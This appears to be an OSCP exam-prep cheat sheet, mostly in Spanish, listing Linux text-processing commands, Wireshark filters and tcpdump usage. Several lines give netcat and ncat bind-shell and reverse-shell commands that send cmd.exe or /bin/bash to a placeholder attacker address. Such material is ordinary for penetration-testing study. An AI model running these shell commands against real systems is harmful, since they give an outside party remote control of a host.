# OSCP_Command_Cheatsheet

## Misc Commands from Linux


Extract file
```
gunzip acces.log.gz
tar -xzvf file.tar.gz
```

Search for a string in command history

```history | grep frase_a_buscar```

Count lines
```	wc -l index.html ```


[comment]: # Visualizar el principio/fin de un fichero	
```head/tail index.html```
[comment]: # Extraer todas las líneas que tienen una string 	
```grep "href=" index.html```
Cortar una string por un delimitador, filtrar los resultados con grep y ordenarlos	grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u
Mostrar el contenido de un fichero usando grep y REGEX para filtrar 	cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt
Ordenar por frecuencia y mostrar todas las IP's presentes en un fichero LOG	cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
Sustituir una determinada cadena por otra	cat algo.txt | awk '{sub(/<cadena_a_sustituir>/,<cadena_a_introducir>);print}' 
Eliminar columna de un fichero de texto delimitada por un separador	cat algo.txt | awk -F: '{print $1":"$3}'
Descodificar desde base64	echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
Cdificar a base64	echo -n "algo" | base64
Descodificar desde HEX	echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
Conectarse a otro puerto en otro host	nc -nv <ip_address> 110
Poner puerto a la escucha	nc -nlvp 4444
Enviar un fichero usando netcat	nc -nv <ip_address> 444 < /usr/share/windows/nc.exe
Recibir fichero con netcat	nc -lvpn 4444 > incoming_file.exe
Bind Shell con netcat en windows	nc.exe -nlvp 3344 -e cmd.exe
Reverse shell con netcat en windows	nc.exe -nv <attacker_IP_address> <PORT> -e cmd.exe
Bind Shell con netcat en linux	nc.exe -nlvp 3344 -e /bin/bash
Reverse shell con netcat en linux	nc -nv <attacker_ip_address> 44444 -e /bin/bash
Bind shell from windows	ncat --exec cmd.exe --allow <attacker_ip> -vnl 4444 --ssl
Listen oin port 444 using ssl	ncat -v <attacker_ip_Address> 444 --ssl
Filtro para mostrar trafico en puerto SMTP (25) y ICMP	tcp.port eq 25 or icmp
Mostrar solo tráfico LAN (sin salida a Internet)	ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16
Filtrar por protocolo (ejemplo SIP) y eliminar tráfico de IP's no deseadas	ip.src !=xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip
Mostrar un ficher pcap	tcpdump -r passwordz.pcap
Mostrar solo IP's y ordenarlas	tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head
Capturar paquetes en el puerto 80	tcpdump tcp port 80 -w output.pcap -i eth0
![image](https://github.com/0xCOrS/OSCP_Command_Cheatsheet/assets/97627828/405424dd-fdf5-430e-a4d0-1f9da129ecc7)
